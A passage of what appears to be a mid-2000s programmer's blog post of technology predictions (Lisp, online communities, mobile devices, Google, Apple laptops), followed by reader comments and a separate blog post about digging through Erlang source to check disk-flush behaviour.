Largely because of Paul 's leadership , everyone 's talking about Lisp .
And as luck would have it , when the world started sniffing around for Lisp documentation , they found it .
Lots of it .
Lisp is the most thoroughly documented language in the world .
There are hundreds of published books about Lisp , and hundreds of others in various fields that use Lisp as their primary language .
Although many are out of print , since Lisp did go through a slump there in the 90's , there are at least a hundred Lisp books in print , with new ones coming out every month .
There 's more online documention available for Lisp than for any other language , in the form of articles , wikis , tutorials , manuals , and sample code .
Once you start looking , it starts to feel like Lisp is everywhere .
It 's the extension language for many Gnu tools ( Gimp , Gnome , Emacs ) .
It 's the first programming language they teach you at U.C. Berkeley , MIT , and several other major universities .
There are several high - quality Lisp implementations for the Java VM that compile down to Java bytecode , and several implementations for .NET as well .
Heck , they even used Lisp for much of the computer animation in Peter Jackson 's Lord of the Rings .
And would n't you know it : Lisp was one of the only two languages originally allowed at Amazon ( the other being ANSI C ) .
Bet you a dollar you did n't know what .
Oh , and an Amazon dev team over in Slough is using Common Lisp right now .
Hi , guys !
Maybe I 'm wrong .
Maybe it will be in the top 5 by 2010 .
We 'll see .
But I think I need to brush up on my Lisp .
Prediction # 6 : A new internet community - hangout will appear .
One that you and I will frequent .
Reason for prediction : People like to socialize .
Where 's the internet community ?
I do n't see it .
People do n't hang out on Amazon 's website , or Google 's , or eBay 's , or Microsoft's .
Not anywhere , really .
There are little chat rooms here and there , and some static link - in sites where you can answer a bunch of questions about your hair color and favorite taco sauce .
Yawn .
Someone told me recently that the consensus among online gamers is that the success of Sony 's EverQuest is largely due to its strong in - game community .
In order to support so many simultaneous players , Sony had to make the monsters really tough , and you have to spend a long time ( like half an hour ) healing after every fight .
So people have nothing to do but sit around campfires and taverns , and socialize .
Hey , remember AOL ?
There 's a blast from the past , eh ?
Oh wait , I guess they 're still around .
Admittedly no self - respecting geek would ever use AOL , but you have to admit : AOL 's big draw , for those who use it , is the community features .
And that 's a big draw .
Big enough to let AOL buy giant entertainment / media conglomerates like Time Warner .
Socialization has to be real - time ; i.e. , things like chat rooms , IRQ , instant messaging .
But those are so boring , so passé .
People also need a reason to hang out , some sort of shared goal or shared frustration that gives them something to talk about during those awkward silences .
Like , games .
Or sports .
Or gambling .
Or discussion groups about books with names like " He 's Just Not That Into You : The No- Excuses Truth to Understanding Guys . "
It 's an uncomfortable truth that most Americans spend the majority of their free time watching television .
They like their mindless entertainment .
But going to the movies is more fun , because there are people there , all ooh - ing and aaah - ing and boo-ing along with you .
Too bad you can't go to the movies and stay at home on your couch simultaneously , eh ?
Games , movies , and chat rooms are all converging , because people want to hang out , be entertained , and be slightly challenged , all while sitting on their couch .
Or possibly sitting in an internet cafe , as 5 percent of the population of Korea does at any given time , playing the online game " Lineage " .
They 've got it figured out better than most other countries .
Wikis , newsgroups , mailing lists , bulletin boards , forums , commentable blogs — they 're all bullshit .
Home pages are bullshit .
People want to socialize , and create content , and compete lightly with each other at different things , and learn things , and be entertained : all in the same place , all from their couch .
Whoever solves this — i.e. whoever creates AOL for real people , or whatever the heck this thing turns out to be — is going to be really , really rich .
Prediction # 7 : The mobile / wireless / handheld market is still at least 5 years out .
Reason for prediction :
My spider - sense is n't tingling yet .
Every year for at least the past decade , pundits have been predicting that next year will be the Year of Wireless Mobile Computing .
They say every human being and most pets on the planet will spend the majority of their disposable income on mobile wireless services for their tiny handheld supercomputer phones .
These devices will have 1900x1200 resolution , 1500 - hour battery lives , T1 connection speeds , microsecond latency , a reception range that covers the planet surface to a depth of six miles , and will cost less than a pack of Mentos .
Every year , it 's next year .
Every next year , it does n't happen .
And you know what ?
Frankly , I 'm getting tired of hearing about it .
When I go to Best Buy or Costco or Rat Shack , I do n't see tiny handheld devices and service plans that are " almost " tempting .
What I see is crap that I would n't buy with someone else 's money .
Every three years I buy the latest and greatest wireless handheld PDA gizmo , and without fail , the gizmos have wound up with a centimeter - thick layer of dust on them .
I have a cold , dead Sharp Zaurus sitting within my peripheral vision even as we speak .
They were going to offer some sort of wireless cellular modem for it , " any time now " .
I was ready to sign up for the service .
I even tried — I called and called , and watched their website like a hawk .
But the service was , alas , never to appear , not even after 18 months of waiting .
My money is still safe in my wallet .
The hip trend for dying companies these days is to change focus overnight , and announce : " We 're making a play in the Wireless market " .
Look a Real Networks .
Or Geoworks .
Or AnythingWorks .
Saying you 're going into Wireless is a hail - Mary play ; a last - ditch attempt to secure another round of VC funding while you pray for the mobile market to explode soon .
Maybe even next year .
But the carriers do n't know what the hell they 're doing , and the content and distribution models are n't worked out yet , and wo n't be for a long time .
A lot of players need to get their collective acts together for the mobile market to take off , and it just has n't been happening .
And today 's mobile devices still suck .
I 'm sure it 's nice to be able to read your Outlook email on your $ 500 Blackberry , but I doubt teenagers are and housewives quite as enamored of the idea as you are .
And I 'm sure it 's nice to be able to scrape enough grease off your PocketPC - phone LCD to deep - fry a country turkey , but it 's maybe not so nice that the grease came from your face .
Do n't get me wrong : it will happen someday .
But I think it 's not going to be any time soon .
Betcha !
Prediction # 8 : Someday I will voluntarily pay Google for one of their services .
Reason for prediction :
They 're putting technological heroin in their services , and someday they 're going to start charging .
Every year I fork over hundreds and hundreds of dollars to Amazon , buying techie books , video games , clothes , kitchen stuff , all sorts of goodies .
And I fork over about three times that much to Starbucks , for lattes .
( My New Year 's Resolution this year was to make absolutely sure I never calculated how much I spend at Starbucks .
2 months to go ! )
I 've never paid Google a dime , as far as I know , and I 'd venture to guess that I 've spent a lot more time on their website than on Amazon's .
Or Starbucks '.
I do a lot of Googling for free , and so do you .
For the life of me , I do n't know how they make their money .
Maybe I 'm missing something really obvious here , but I do n't see how they can be a 2 gazillion dollar company , or whatever they are nowadays , purely on search engine sales and ad revenues .
I was under the impression that internet companies that make money make it from consumers .
B2B failed .
Eyeball counting failed .
Well , that 's what I thought , anyway .
But I can tell you this : Google has changed my life .
If I can't find what I 'm looking for in Google in 3 tries , looking no further than the first 10 search results on each try , then it probably does n't exist .
Google is every bit as important a programmer - tool for me as my compiler is .
And it 's pretty darn important for my day - to - day life , too .
As one example , I never use a phone book anymore .
Want Uwajimaya 's number ?
Type " Uwajimaya " into Google .
You can even find it by spelling it incorrectly as " Uwajamaya " .
I just tried it .
Google is , for now at least , the font of all knowledge .
There are a few upstarts here and there — Wikipedia , IMDB , dictionary.com , and a handful of other reasonably useful information sources .
Even Amazon 's search - inside - the - book is handy pretty often .
But I still use Google a hundred times as often as those other sources combined .
And just when I thought they had it licked , they came out with the desktop search appliance .
I just installed it yesterday .
Only took 10 seconds .
I proceeded to forget about it immediately .
A few minutes later , one of my normal Google searches scared the pants off me — it turned up some stuff that I thought only existed on my computer .
Oh .
Duh .
LXR ?
I doubt it 'll be useful anymore , once Google has indexed my source code , which I 'm sure it has .
Lemme check .
Yup .
I just typed a Java identifier name into my IE Google toolbar , and the first two search results were source files that I 'd written .
( Bizarrely , it 's not pulling up the file when I click on it , though .
Maybe I have the . java extension bound to some app that 's not starting up . )
In any case , Google has just changed my life again , this time by organizing my filesystem for me .
Sort of .
It 's just the way it was before , but now nothing is lost .
And believe you me , up until yesterday , I used to misplace documents frequently .
I had things stashed in too many places .
But it 's suddenly a non-issue .
They 're all in my browser window now .
And I still have n't ever paid Google a dime .
But I 'm convinced — someday , I will .
As soon as they want me to .
Prediction # 9 : Apple 's laptop sales will exceed those of HP / Compaq , IBM , Dell and Gateway combined by 2010 .
Reason for prediction : Macs rule .
Windows laptops are as exciting as a shiny disco ball in the ceiling .
I bought a Powerbook for my wife Linh about 8 months ago , and she uses it so much that I can't even sneak a peek at it once in a while .
I just looked over at its little spot on our desk , and it 's not there .
She 's using it right now .
I bet she 's on that thing for 3 hours a day at least , maybe more — playing games , reading mail , surfing the web , sharing pictures with her sisters .
Doing Google searches , and I did n't tell her about Google .
She just sorta found it .
Before I bought her that Powerbook , her average computer usage was around an hour a year .
When 's the last time you saw a movie in the theater , and someone was using a laptop , and it was n't some flavor of Mac ?
I think it 's been at least 3 years for me .
Everyone in the movies uses Macs , because Macs are hip .
They 're in .
That 's what you use if you 're cool .
You see them in TV commercials , TV shows , movies .
You see them on airplanes , and at Starbucks .
You see them in your co-workers ' cubes .
Macs are a triple - threat right now : they 're trendy ( which rarely correlates with quality ; it 's simply a marketing feat ) , they 're actually easy to use for non-computer users , and they 're a powerful platform for developers and power - users .
There 's something there for everyone .
Actually , I know exactly squat about laptop sales figures , and I do n't know what Apple 's market share is , or how fast it 's growing .
And this blog has gone on so long that I do n't feel like researching it right now , even though Google would probably tell me in under 10 seconds .
But I can tell you that their market share is growing .
Fast .
Any idiot could tell you that .
I can tell you because I want one .
Bad .
And the desire is growing .
My rule of thumb for products and services is : if I would go pay for it today , then it 's going to be big .
( If I 'd stand in line to pre-order it , it 'll be huge ) .
It 's not always an accurate predictor , but it 's pretty reliable .
If you 're building a product or a service , and you keep thinking to yourself : " I would n't use this .
Who would use this ?
I do n't know anyone who would use this , " then it 's a sure bet that you 're right , and nobody will use it .
Investors and marketeers and executives and product managers regularly fool themselves into thinking that something will be cool , but when it lauches , it 's a flop .
That 's because they 're building things for other people .
But that 's not the way great things get built .
You have to build them for yourself .
Apple does things right .
Steve Jobs is a smart guy .
I do n't think Microsoft really builds things for themselves , or maybe they 're just not very good at knowing what they like .
I 'm using Windows machines today , but only because the open - source community has helped turn Windows into a reasonable platform .
I 'm using Windows mostly for the device drivers ; in most respects , my Windows desktop looks like Unix .
But now the open - source community likes Macs just as much as you and I do .
So before long , maybe even now , Macs will be a better choice for the majority of my computer activities , including programming .
And when that happens , who would buy a PC laptop ?
Not me , that 's for sure .
My next one will be a Mac .
Prediction # 10 : In five years ' time , most programmers will still be average .
Reason for prediction :
That 's just how the math works out .
Of course most programmers will still be average , by definition .
The problem is that the average level of quality and productivity probably wo n't have changed all that much .
The difference between great hackers and average plodders is a hundred - fold , which implies great potential for improving the average .
But I doubt the industry average productivty / quality per-capita output will go up even 50 % over the next 5 years , let alone 2 orders of magnitude .
Partly because there are too many J2EE consultants out there ruining the numbers .
But more importantly , most people are just doing this gig for a living .
So most people will still be average , and average will still be ho-hum .
What will you be ?

Interesting stuff all around .
I just thought I would mention that I got the hairs raising on the back of my neck feeling when I reached number 4 .
Just this morning I dusted off my copy of " Jython Essentials " in another attempt to sneak into the world of Java development by using a different language , and had been enjoying it immensely .
Do you happen to know the names of any of the LISP dialects that are available on the JVM ?

Cool .
Last time I got that feeling was after watching The Ring by myself one night .
Jython 's a good choice , possibly the best one right now .
Clean , simple , powerful language , and it does n't have anything missing ; you can do anything in Jython that you can in Java , including subclassing Java classes .
And there are at least two books out on it , maybe three .
I 've done a lot of programming in Jython , and I still enjoy it quite a bit .
Armed Bear Common Lisp is ( apparently ) the best - supported CL implementation for the JVM .
I 'm going to be experimenting with it over the next week or two .
Kawa
Scheme is by far the most complete Lisp implementation for the JVM , and has bells and whistles you 'd scarcely believe .
It 's even got CL - style macros and the ability to use static typing , which even Jython does n't have .
It 's amazing .
Kawa 's main problem is that it's not yet a drop - in replacement for Java ; for instance , when I checked 2 months ago , there was no way to declare a non -default constructor that took parameters , although Per Bothner was allegedly going to add it soon .
But I do n't think anyone has made a concerted effort to check whether Kawa matches Java feature - for - feature .
Needs to happen at some point , or there will be certain Java APIs you simply can't use .
A secondary problem with Kawa is that the docs do n't teach you Scheme ; they just explain the diffs between Scheme and Kawa , and give you a brief overview of what the JVM integration looks like .
I think the only way to get up to speed on it , really , is to work your way through the examples in a Scheme book ( or books ) with Kawa , and whenever something does n't work , look at Kawa 's docs to figure out how Kawa does it .
Those are the two I 'm planning on using from now on .
I 've decided that I can't waste any more time ; if Lisp is the future , then I need to master it , and the only way to do that is to program in it .
So I 'm going to do ALL my personal coding in Lisp and Scheme from now on ( * gulp * ) , mostly on the JVM though , so I can at least ease into it by knowing the libraries already .
Good luck !

Steve , you got yourself a bad case of ' Paul Graham ' - itis ...
You need to seriously stop reading / buying into his Lisp self - indulgence .
Lisp and the like have existed for years ... you do n't see them taking over yet , do you ?
They have n't and they wo n't .
I admire the guy do n't get me wrong , but sometimes I think he's on the verge of being delusional ...

Hello Anonymous Commenting Person ,
Paul Graham has to be that way .
Not just because he 's a rich bastard who ( with two friends ) implemented an application in Lisp that we 've been unable to match at Amazon , and Yahoo bought him out for $ 40 million in stock that proceeded to soar .
That 's not the main reason he comes off the way he does , although as far as I 'm concerned , it gives him at least a halfway decent excuse .
Paul comes off the way he does because he 's good at marketing , and he realizes that in a world full of egotistical programmers , the only way to be heard in all the noise is to be an arrogant bastard .
Stroustroup 's the same way , and James Gosling has a big company that can set him up on a pedestal , or he'd have to be that way too .
And Larry Wall - well , Larry outdoes them all .
Larry says that God talks to him and tells him He only likes Perl programmers .
If Paul Graham appears to be delusional to you , read some of Larry 's speeches sometime , like this one : http://www.wall.org/~larry/pm.html
We work in a fashion industry , and marketing really matters .
Paul 's marketing is getting the appropriate attention , so you can't fault his methods .
I 'll stick with my prediction .

Typical Open Source Software Moment
The thing open source advocates always tout about open source software is that you can open the hood and poke around and change things if necessary .
The ability to customize your app and the source code level is nothing short of Real Ultimate Power .
( My friend Mark said that he saw a OSS guy totally uppercut some kid just because the kid opened Windows )
So last night , I put that to the test .
I wanted to find out some details about how Erlang handles some low level file operations .
My new Erlang based CouchDb engine , which is now storing and retrieving documents , seems a little too fast right out of the gate , and I suspect it 's because the flush operations ( ' sync ' in Erlang ) I 'm performing are n't actually flushing to disk .
Which is possible because the Erlang documentation says the ' sync ' operation does n't work on all platforms .
But it does n't say which platforms .
Swell .
But wait !
It 's open source , I 'm a coder !
I can just look at the code and figure it out !
And yet , after many hours of searching the Erlang source code , I still have n't figured out how Erlang translates file system operations down to OS level calls .
I 've scanned many thousands of lines of source code , I 've searched for file function calls in every file API I can think of .
And still I can't figure out how it 's doing it .
I 've looked at lots of interesting networking code , and I now have a better understanding of how the Erlang source is organized .
But by just looking at the source code , I have n't been able to answer my rather simple question :
Do Erlang disk flushes actually work on Windows ?
This is n't to say it 's impossible for me figure out , but it going to require me to understand the core underpinnings of Erlang 's bootstrapping process .
Essentially , to answer a very simple question about the Erlang source code , I now have to spend who knows how many hours becoming familiar with the guts of Erlang 's runtime .
And while that 's kind of fun , it is n't helping me get Couch built .
It 's a big distraction .
For now I 'm just going to write it down as a possible outstanding issue .
Often answers to questions like this pop up at unexpected times , so its best just to move on and wait for it .
If I never find the answer then I 'll pester someone who 's familiar with Erlang source .
If the answer is that I must modify the source to get the behavior I need , then I 'll cross that bridge when I get to it .
Having the source code is n't quite the benefit open source advocates would have you believe .
It is n't like having detailed instructions for a model battleship , it 's more like all the parts were dumped out onto the table .
Good luck with all that .
